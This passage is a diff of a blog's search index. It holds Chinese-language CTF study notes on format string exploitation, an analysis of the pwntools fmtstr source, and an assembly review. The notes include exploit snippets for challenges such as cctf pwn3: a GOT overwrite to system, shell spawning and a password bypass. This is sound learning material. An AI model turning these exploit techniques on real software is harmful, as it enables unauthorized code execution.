+log.success("system_addr =&gt; {}".format(hex(system_addr)))
+
+payload = fmtstr_payload(offset, {func_got : system_addr})
+r.send(payload)
+r.send('/bin/sh')
+r.recv()
+r.interactive()
+</code></pre>
+<p>​    </p>
+<p>​    其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。</p>
+<h5 id="源码分析">源码分析<a class="post-anchor" href="#源码分析"></a></h5><p>​    pwntools定义了一个<code>FmtStr</code>类，来实现格式化字符串漏洞的利用。</p>
+<p>​    ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是：<a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg" data-caption="IMG_0352" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg" alt="IMG_0352"></a></p>
+<p>​    所以下图中的代码也就能够理解了，就是将参数传入实例本身。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png" data-caption="截屏2021-10-29 下午2.08.21" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png" alt="截屏2021-10-29 下午2.08.21"></a></p>
+<p>​    然后，是功能实现的第一步–偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。</p>
+<p>​    很显然这个功能的实现是基于<code>find_offset</code>方法。</p>
+<p>​    方法的内容其实比较简单：</p>
+<pre><code class="python">  def find_offset(self):
+        marker = cyclic(20)#cyclic 20个字符
+        for off in range(1,1000):#从1-1000，爆破偏移量
+            leak = self.leak_stack(off, marker)
+            leak = pack(leak)#leak = p(leak_stack)
+            pad = cyclic_find(leak[:4])
+            if pad &gt;= 0 and pad &lt; 20:
+                return off, pad
+        else:
+            log.error("Could not find offset to format string on stack")
+            return None, None
+</code></pre>
+<p>​    而实现方法<code>find_offset</code>，又依靠方法<code>leak_stack</code></p>
+<pre><code class="python">    def leak_stack(self, offset, prefix=b""):
+        payload = b"START%%%d$pEND" % offset
+        leak = self.execute_fmt(prefix + payload)
+        try:
+            leak = re.findall(br"START(.*?)END", leak, re.MULTILINE | re.DOTALL)[0]
+            leak = int(leak, 16)
+        except ValueError:
+            leak = 0
+        return leak
+</code></pre>
+<p>​    <code>cyclic</code>的代码也顺便放一放（</p>
+<pre><code class="python">def cyclic_find(subseq, alphabet = None, n = None): 
+  if n is None:
+        n = context.cyclic_size
+
+    if isinstance(subseq, six.integer_types):
+        subseq = packing.pack(subseq, bytes=n)
+    subseq = packing._need_bytes(subseq, 2, 0x80)
+
+    if len(subseq) != n:
+        log.warn_once("cyclic_find() expects %i-byte subsequences by default, you gave %r\n"
+            "Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\n"
+            "Truncating the data at 4 bytes.  Specify cyclic_find(..., n=%i) to override this.",
+            n, subseq, len(subseq), len(subseq))
+        subseq = subseq[:n]
+
+    if alphabet is None:
+        alphabet = context.cyclic_alphabet
+    alphabet = packing._need_bytes(alphabet, 2, 0x80)
+
+    if any(c not in alphabet for c in subseq):
+        return -1
+
+    n = n or len(subseq)
+
+    return _gen_find(subseq, de_bruijn(alphabet, n))
+</code></pre>
+<p>​    之前一直对<code>cyclic</code>的实现抱有兴趣，抽个时间可以看看源码分析。</p>
+<p>​    </p>
+<p>​        </p>
+<h3 id="4）总结">4）总结<a class="post-anchor" href="#4）总结"></a></h3><p>​    part1和part2主要涉及汇编对函数调用栈知识，如果对栈溢出熟悉的话其实理解起来真的非常轻松，也没有什么好说的。</p>
+<p>​    主要的困难集中在part3，也就是对fmtstr功能实现的分析，我从来没有系统地学习过面向对象的编程语言，只会写一写前端的js和简单的py脚本，对于类，对象以及函数，数据类型啥的关系都傻傻搞不清楚，这给我分析源码造成很大的困难。不过好在足够简单，也有时间去分析。以后还是需要搞清楚面向对象程序开发的一些基础知识，在各种方面都是挺有用的，尤其是自动化的一些脚本开发上。</p>
+<p>​    通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。</p>
+<p>​    然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？</p>
+<h3 id="5）参考">5）参考<a class="post-anchor" href="#5）参考"></a></h3><p>​    <a href="https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr"><code>pwnlib.fmtstr</code>— Format string bug exploitation tools</a> </p>
+<p>​    <a href="https://blog.csdn.net/weixin_43092232/article/details/105647076">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>
+<p>​    <a href="https://blog.csdn.net/qq_33976344/article/details/113503914">pwntools中fmtstr的使用</a></p>
+<p>​    <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">3.1.1 格式化字符串漏洞</a></p>
+<p>​    <a href="https://blog.csdn.net/CLHugh/article/details/75000104">Python中self用法详解</a></p>
+</body></html>]]></content>
+      <tags>
+        <tag>format</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>格式化字符串漏洞学习</title>
+    <url>/2021/10/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<html><head></head><body><h2 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h2><p>绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>
+<p>首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。</p>
+<p>所以碰到这道题，算是又给我敲了第nn个警钟。</p>
+<p>非常清晰地告诉我：我是垃圾。</p>
+<h2 id="2）格式化字符串基本原理">2）格式化字符串基本原理<a class="post-anchor" href="#2）格式化字符串基本原理"></a></h2><p>ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>
+<h5 id="格式化字符串参数">格式化字符串参数<a class="post-anchor" href="#格式化字符串参数"></a></h5><pre><code class="c">%[parameter][flags][field width][.precision][length]type
+</code></pre>
+<ul>
+<li><p>parameter</p>
+<ul>
+<li>n$，获取格式化字符串中的指定参数</li>
+</ul>
+</li>
+<li><p>flag</p>
+</li>
+<li><p>field width</p>
+<ul>
+<li>输出的最小宽度</li>
+</ul>
+</li>
+<li><p>precision</p>
+<ul>
+<li>输出的最大长度</li>
+</ul>
+</li>
+<li><p>length，输出的长度</p>
+<ul>
+<li>hh，输出一个字节</li>
+<li>h，输出一个双字节</li>
+</ul>
+</li>
+<li><p>type</p>
+<ul>
+<li>d/i，有符号整数</li>
+<li>u，无符号整数</li>
+<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li>s，如果没有用 l 标志，输出 null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>
+<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>
+<li><strong>p， void * 型，输出对应变量的值</strong>。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>
+<li>n，不输出字符，<strong>但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</strong>。</li>
+</ul>
+<h5 id="格式化字符串漏洞利用">格式化字符串漏洞利用<a class="post-anchor" href="#格式化字符串漏洞利用"></a></h5><p>一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。</p>
+<p>一般来说不正确的方式有这几种</p>
+<ol>
+<li>一直%s，容易引用不合法的地址，造成程序崩溃   </li>
+<li>通过打印的相关内存信息，泄露内存布局，获得有用的信息</li>
+</ol>
+<h2 id="3-例1-goodluck">3)例1:goodluck<a class="post-anchor" href="#3-例1-goodluck"></a></h2><p>话不多说，直接上例子。</p>
+<h3 id="程序逻辑分析">程序逻辑分析<a class="post-anchor" href="#程序逻辑分析"></a></h3><p>第一步，清晰而准确的逆向是漏洞点利用的基础。</p>
+<p>首先，程序读取flag，通过<code>_IO_getc(fp)</code>，一个字符一个字符地将flag读入v10。</p>
+<p>然后将flag的首地址给v9。</p>
+<p>然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（</p>
+<p>然后看一个关于fflush的详解</p>
+<p><a href="http://c.biancheng.net/cpp/html/2506.html">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>
+<p>但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。</p>
+<p>bss段存储未初始化的全局变量，也不是缓冲区吧。</p>
+<h4 id="缓冲区">缓冲区<a class="post-anchor" href="#缓冲区"></a></h4><p><em>从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。</em></p>
+<p>为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，<code>cingetchar</code>函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。</p>
+<h5 id="缓冲区的分类">缓冲区的分类<a class="post-anchor" href="#缓冲区的分类"></a></h5><h6 id="1-全缓冲。">1:全缓冲。<a class="post-anchor" href="#1-全缓冲。"></a></h6><p>只有在缓冲区被填满之后才会进行<code>I/O</code>操作；最典型的全缓冲就是对磁盘文件的读写。</p>
+<h6 id="2-行缓冲">2:行缓冲<a class="post-anchor" href="#2-行缓冲"></a></h6><p>只有在输入或者是输出中遇到换行符的时候才会进行<code>I/O</code>操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做<code>I/O</code>操作。一般来说，标准输入流(<code>stdin</code>)和标准输出流(<code>stdout</code>)是行缓冲</p>
+<h6 id="3-无缓冲">3:无缓冲<a class="post-anchor" href="#3-无缓冲"></a></h6><ol>
+<li>无缓冲；标准<code>I/O</code>不缓存字符；其中表现最明显的就是标准错误输出流(<code>stderr</code>)，这使得出错信息尽快的返回给用户。</li>
+</ol>
+<p>（我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错）</p>
+<h5 id="fflush函数">fflush函数<a class="post-anchor" href="#fflush函数"></a></h5><p>然后是关于fflush函数的glibc源码。</p>
+<p>fflush实际是调用vtable中的函数<code>_IO_new_file_sync</code>，这个函数的源码如图：</p>
+<p>（<code>/glibc-2.23/libio/fileops.c:867</code>）</p>
+<pre><code class="c">int
+_IO_new_file_sync (_IO_FILE *fp)
+{
+  _IO_ssize_t delta;
+  int retval = 0;
+
+  /*    char* ptr = cur_ptr(); */
+  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
+    if (_IO_do_flush(fp)) 
+    return EOF;//end of file
+  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;
+  if (delta != 0)
+    {
+#ifdef TODO
+      if (_IO_in_backup (fp))
+    delta -= eGptr () - Gbase ();
+#endif
+      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);
+      if (new_pos != (_IO_off64_t) EOF)
+    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;
+#ifdef ESPIPE
+      else if (errno == ESPIPE)
+    ; /* Ignore error from unseekable devices. */
+#endif
+      else
+    retval = EOF;
+    }
+  if (retval != EOF)
+    fp-&gt;_offset = _IO_pos_BAD;
+  /* FIXME: Cleanup - can this be shared? */
+  /*    setg(base(), ptr, ptr); */
+  return retval;
+}
+libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)
+</code></pre>
+<p>虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。</p>
+<h5 id="pwntools与缓冲区机制">pwntools与缓冲区机制<a class="post-anchor" href="#pwntools与缓冲区机制"></a></h5><p>某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。</p>
+<p>为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%94%E5%A4%A9--pwntools%E6%BA%90%20%E7%A0%81%20%E5%89%96%20%E6%9E%90--%E4%BB%A5%E6%BA%90%E7%A0%81%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90io%E4%BA%A4%E4%BA%92%E5%8E%9F%E7%90%86/">pwntools源码剖析（1）–以源码的角度分析io交互原理</a></p>
+<h4 id="ms？">%ms？<a class="post-anchor" href="#ms？"></a></h4><p>从缓冲区的研究回到程序的简单逻辑分析上。</p>
+<p><code>__isoc99_scanf("%ms", &amp;format);</code></p>
+<p>接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里）</p>
+<p>然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。</p>
+<h3 id="漏洞利用">漏洞利用<a class="post-anchor" href="#漏洞利用"></a></h3><p>因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。</p>
+<p>那么如何打印这个flag呢？</p>
+<p>我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png" data-caption="截屏2021-10-26 下午10.31.45" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png" alt="截屏2021-10-26 下午10.31.45"></a></p>
+<p>flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。</p>
+<p>这时候就需要计算这个flag字符串与栈顶的偏移。</p>
+<p>![截屏2021-10-26 下午10.35.39](/Users/rin/Library/Application Support/typora-user-images/截屏2021-10-26 下午10.35.39.png)</p>
+<p>显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。</p>
+<p>利用%n$s打印参数，即可获得flag。</p>
+<h2 id="4-例2">4)例2<a class="post-anchor" href="#4-例2"></a></h2><p>经过刚才的开胃菜，我们总算进入了正题。</p>
+<p>一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。</p>
+<p>但是如果需要修改函数的got表，我们需要满足几个条件：</p>
+<ol>
+<li>知道需要修改的函数的真实地址。</li>
+<li>需要想办法改写函数的got表。</li>
+</ol>
+<p>一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（</p>
+<p>回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子</p>
+<h3 id="cctf-pwn3">cctf pwn3<a class="post-anchor" href="#cctf-pwn3"></a></h3><h5 id="程序分析">程序分析<a class="post-anchor" href="#程序分析"></a></h5><p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png" data-caption="截屏2021-10-27 上午8.50.03" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png" alt="截屏2021-10-27 上午8.50.03"></a></p>
+<h5 id="程序逻辑分析-1">程序逻辑分析<a class="post-anchor" href="#程序逻辑分析-1"></a></h5><p>还是先进行一个简单的逻辑分析。</p>
+<p>首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png" data-caption="截屏2021-10-27 上午9.02.34" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png" alt="截屏2021-10-27 上午9.02.34"></a></p>
+<p>所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。</p>
+<p>当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址。</p>
+<p>首先我们确定字符串偏移。</p>
+<h5 id="gdb动调的一些坑">gdb动调的一些坑<a class="post-anchor" href="#gdb动调的一些坑"></a></h5><p>用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成<code> ERROR: Could not find ELF base!</code></p>
+<p>原因详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%9B%9B%E5%A4%A9--gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/">摆烂第四天–gdb附加调试的一些黑魔法</a>的2.1节。</p>
+<p>因为一下断点，程序就异常退出，所以这道题又非常不幸地沦为了看，而不是调。</p>
+<p>等问题解决了在再来调。</p>
+<pre><code class="python">tmp = 'sysbdmin'
+name = ""
+for i in tmp:
+    name += chr(ord(i) - 1)
+
+
+## password
+def password():
+    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
+    sh.sendline(name)
+</code></pre>
+<p>绕过密码的关键函数。其实绕过的核心思路就是strcmp的返回值，strcmp是以asc2码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的asc2小，但字符长度相等的字符。</p>
+<p>这样就有了代码中的公式。</p>
+<p>当我们绕过了密码，然后就需要打印puts函数的真实地址。</p>
+<p>打印真实地址，第一步需要找到格式化字符串在栈中的偏移。</p>
+<p>关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。</p>
+<p>原理参见：<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
+<p>这里的偏移是8</p>
+<pre><code class="python"># get the addr of puts
+puts_got = pwn3.got['puts']
+log.success('puts got : ' + hex(puts_got))
+put(b'1111', b'%8$s' + p32(puts_got))
+puts_addr = u32(get('1111')[:4])
+</code></pre>
+<p>然后put一个名为1111的文件，内容是格式化字符串以及puts的got表地址。</p>
+<p>这里<code>%8$s' + p32(puts_got)</code>应该是先把puts的got表传进去，然后再通过%8$s打印。</p>
+<p>然后接收信息，就是puts的got表。</p>
+<p>然后就是经典rop的确定libc基址和system地址，比较套路。</p>
+<p>下一个关键点是</p>
+<pre><code class="python">payload = fmtstr_payload(7, {puts_got: system_addr})
+put('/bin/sh;', payload)
+sh.recvuntil('ftp&gt;')
+sh.sendline('get')
+sh.recvuntil('enter the file name you want to get:')
+##gdb.attach(sh)
+sh.sendline('/bin/sh;') 
+</code></pre>
+<p>​    这里其实主要的问题都是被<code>fmtstr_payload</code>函数解决了。</p>
+<p>​    这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。</p>
+<p>​    关于函数是如何实现的，可以参见另外一篇笔记。<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
+<p>最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。</p>
+<p>​    </p>
+<p>​    这个题的调试部分才是大头，一点一点把问题解决吧。</p>
+<h4 id="调试部分">调试部分<a class="post-anchor" href="#调试部分"></a></h4><p>​    思路和exp都很清楚的情况下，我们尝试对题目进行调试。</p>
+<h2 id="参考">参考<a class="post-anchor" href="#参考"></a></h2><p><a href="https://zhuanlan.zhihu.com/p/79504011">缓冲区机制详解</a></p>
+<p><a href="http://c.biancheng.net/cpp/html/2506.html">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>
+<p><a href="https://stackoverflow.com/questions/38685724/difference-between-ms-and-s-scanf">difference between %ms and %s scanf</a></p>
+<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/">格式化字符串</a></p>
+<p>[格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测)</p>
+</li>
+</ul>
+</body></html>]]></content>
+      <tags>
+        <tag>format</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>简单的汇编语言复习</title>
+    <url>/2021/10/13/%E5%86%8D%E6%8E%A2%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
+    <content><![CDATA[<html><head></head><body><h3 id=""><a class="post-anchor" href="#"></a></h3><h3 id="1）寻址">1）寻址<a class="post-anchor" href="#1）寻址"></a></h3><h5 id="1-直接寻址">1/直接寻址<a class="post-anchor" href="#1-直接寻址"></a></h5><pre><code class="asm">mov     rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。
+</code></pre>
+<h5 id="2-间接寻址">2/间接寻址<a class="post-anchor" href="#2-间接寻址"></a></h5><p>间接在使用指针以及解引用的形式</p>
+<pre><code class="asm">mov     [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。
+</code></pre>
+<h5 id="3-比例寻址">3/比例寻址<a class="post-anchor" href="#3-比例寻址"></a></h5><p>例如在数组遍历中</p>
+<pre><code class="asm">.data
+arrayD 1,2,3,4
+.code
+mov esi,3
+mov eax,arrayD[esi*4]                    ;eax = 4
+</code></pre>
+<p>其中，比例因子“4”代表数组的元素个数，esi的值代表下标。</p>
+<h2 id="2）段寄存器">2）段寄存器<a class="post-anchor" href="#2）段寄存器"></a></h2><p>其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h</p>
+<h2 id="3）基础指令">3）基础指令<a class="post-anchor" href="#3）基础指令"></a></h2><h3 id="1-数据传输">1/数据传输<a class="post-anchor" href="#1-数据传输"></a></h3><h4 id="mov">mov<a class="post-anchor" href="#mov"></a></h4><p>为了实现各种数据的传输，mov还有一下几种派生指令</p>
+<h5 id="movzx">movzx<a class="post-anchor" href="#movzx"></a></h5><p>对目的操作数进行全0拓展并且复制。</p>
+<h5 id="movsx">movsx<a class="post-anchor" href="#movsx"></a></h5><p>同上，但是是用1拓展而不是0。</p>
+<p>与数据传输相关的指令还有很多，以后待补充。</p>
+<h3 id="2-与数据相关的运算符和伪指令">2/与数据相关的运算符和伪指令<a class="post-anchor" href="#2-与数据相关的运算符和伪指令"></a></h3><h4 id="offset">offset<a class="post-anchor" href="#offset"></a></h4><p>返回一个偏移量</p>
+<h4 id="align">align<a class="post-anchor" href="#align"></a></h4><p>将一个变量对齐到边界。</p>
+<p>ps：对于cpu来说，处理偶地址速度会快于奇地址。</p>
+<h4 id="ptr">ptr<a class="post-anchor" href="#ptr"></a></h4><p>重写一个已经被声明过操作数的大小类型。</p>
+<h4 id="type">type<a class="post-anchor" href="#type"></a></h4><p>返回变量单个元素的大小</p>
+<h4 id="lengthof">lengthof<a class="post-anchor" href="#lengthof"></a></h4><p>计算数组中元素的个数</p>
+<h4 id="sizeof">sizeof<a class="post-anchor" href="#sizeof"></a></h4><p>返回lengthof和type的乘积</p>
+<h3 id="-1"><a class="post-anchor" href="#-1"></a></h3></body></html>]]></content>
+      <tags>
+        <tag>asm Primary</tag>
       </tags>
   </entry>
 </search>
